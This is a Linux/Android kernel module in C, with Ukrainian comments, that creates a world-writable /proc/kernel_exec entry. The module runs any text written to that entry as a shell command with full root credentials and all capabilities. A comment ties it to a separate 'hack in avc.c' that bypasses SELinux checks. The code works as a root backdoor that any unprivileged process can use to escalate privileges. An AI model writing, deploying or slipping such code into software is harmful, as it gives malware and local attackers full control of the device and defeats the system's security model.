#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/string.h>
#include <linux/cred.h>     
#include <linux/version.h>
#include <linux/slab.h>     

#define PROC_NAME "kernel_exec"
#define BUFFER_SIZE 1024

static struct proc_dir_entry *proc_file;

// Встановлення максимальних системних прав Linux для створюваного процесу
static int init_absolute_creds(struct subprocess_info *info, struct cred *new) {
    // Надаємо процесу максимальні системні права (Capabilities)
    cap_set_full(new->cap_inheritable);
    cap_set_full(new->cap_permitted);
    cap_set_full(new->cap_effective);
    cap_set_full(new->cap_bset);

    // Повний Root (UID 0, GID 0)
    new->uid = GLOBAL_ROOT_UID;
    new->gid = GLOBAL_ROOT_GID;
    new->euid = GLOBAL_ROOT_UID;
    new->egid = GLOBAL_ROOT_GID;
    new->suid = GLOBAL_ROOT_UID;
    new->sgid = GLOBAL_ROOT_GID;
    new->fsuid = GLOBAL_ROOT_UID;
    new->fsgid = GLOBAL_ROOT_GID;

    return 0;
}

static void execute_absolute_command(const char *cmd_string) {
    struct subprocess_info *sub_info;
    char *cmd_v;
    char **argv;
    char **envp;

    // Динамічно виділяємо пам'ять в купі ядра під команду та аргументи
    cmd_v = kstrdup(cmd_string, GFP_KERNEL);
    argv = kmalloc(sizeof(char *) * 4, GFP_KERNEL);
    envp = kmalloc(sizeof(char *) * 3, GFP_KERNEL);

    if (!cmd_v || !argv || !envp) {
        kfree(cmd_v); kfree(argv); kfree(envp);
        return;
    }

    argv[0] = "/system/bin/sh";
    argv[1] = "-c";
    argv[2] = cmd_v;
    argv[3] = NULL;

    envp[0] = "PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin";
    envp[1] = "HOME=/";
    envp[2] = NULL;

    // Налаштування та запуск. Оскільки ініціатор виклику має ssid == 1,
    // твій хак в avc.c автоматично пропускає створення цього процесу.
    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, 
                                         init_absolute_creds, NULL, NULL);
    
    if (sub_info) {
        call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    } else {
        pr_err("[KernelExec] Не вдалося налаштувати subprocess_info.\n");
    }

    // Безпечне очищення пам'яті для запобігання Double Free та витоків
    kfree(cmd_v);
    kfree(argv);
    kfree(envp);
}

static ssize_t proc_write_compat(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) {
    char input_buf[BUFFER_SIZE];
    size_t copy_len = (count < BUFFER_SIZE - 1) ? count : (BUFFER_SIZE - 1);

    if (copy_from_user(input_buf, ubuf, copy_len)) return -EFAULT;
    input_buf[copy_len] = '\0';

    if (copy_len > 0 && input_buf[copy_len - 1] == '\n') {
        input_buf[copy_len - 1] = '\0';
    }

    execute_absolute_command(input_buf);
    return count;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops exec_fops = { .proc_write = proc_write_compat };
#else
static const struct file_operations exec_fops = { .owner = THIS_MODULE, .write = proc_write_compat };
#endif

static int __init kernel_exec_init(void) {
    proc_file = proc_create(PROC_NAME, 0666, NULL, &exec_fops);
    if (!proc_file) return -ENOMEM;
    return 0;
}

static void __exit kernel_exec_exit(void) {
    if (proc_file) proc_remove(proc_file);
}

module_init(kernel_exec_init);
module_exit(kernel_exec_exit);
MODULE_LICENSE("GPL");
